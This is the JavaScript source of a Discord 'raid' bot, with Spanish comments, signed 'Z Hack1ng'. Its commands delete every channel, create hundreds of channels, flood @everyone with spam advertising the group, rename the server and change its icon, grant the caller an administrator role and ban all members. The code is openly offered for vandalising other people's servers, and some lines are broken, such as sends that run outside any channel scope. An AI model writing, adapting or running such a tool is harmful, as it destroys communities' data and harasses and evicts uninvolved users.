
const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

client.on("ready", () => {

  console.log(chalk.red(`
Bot Encendido Cliente ${client.user.tag}
  `))



  console.log(chalk.cyan(`
                                          [+] Comandos:
                                          
                                           ღ .on | Jode el servidor de inmediato, ejecutando todos los comandos.
                                           ღ .nuke | Elimina todos los chats, dejando solo 1 para poner otros comandos.
                                           ღ .raid | Crea muchos canales con ping y mensajes.
                                           ღ .admin | Crea un rol con perms de administrador y te lo da.
                                           ღ .crearroles / . eliminarroles | Crea o elimina roles del servidor
                                           ღ .banall | Este comando banea a todos los usuarios del servidor (algunas veces falla)
                                           ღ .mdall | Envia multiples mensajes a todos los miembros del servidor
                                           ღ .lista | Obten informacion del raid (stats)


`))


  presencia();
});

keepAlive();
const monitor = new Monitor({
  website: 'https://sombras-2.markox36.repl.co',
  title: 'Secundario',
  interval: 15 // minutes
});

////////Monitor//////////
monitor.on('up', (res) => console.log(`${res.website} está encedido.`));
monitor.on('down', (res) => console.log(`${res.website} se ha caído - ${res.statusMessage}`));
monitor.on('stop', (website) => console.log(`${website} se ha parado.`));
monitor.on('error', (error) => console.log(error));
//////////////////////

function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: "#Z Hack1ng x ! Jimo",
      type: "PLAYING"

    }
  });
}


//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.on') {

    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Z Hack1ng x ! Jimo`, {
      type: 'text'
    }).then(channel => {
      channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀")
    })
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`Z Hack1ng x ! Jimo`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");

      })
    }
    message.guild.setName("#Z Hack1ng");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/1020498675887255582/1028363473568137297/logo.jpg");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");





    
  
  }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "$",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.lista') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del raid")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//banall

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        member.ban();
      }
    })
  }
});


//nuke 

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Z Hack1ng➜ ! Jimo`, {
      type: 'text'
    }).then(channel => {
      channel.send("https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif")
    })
  }
})


//chats

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === '.raid') {
    message.delete()
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`Z Hack1ng➜ ! Jimo`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
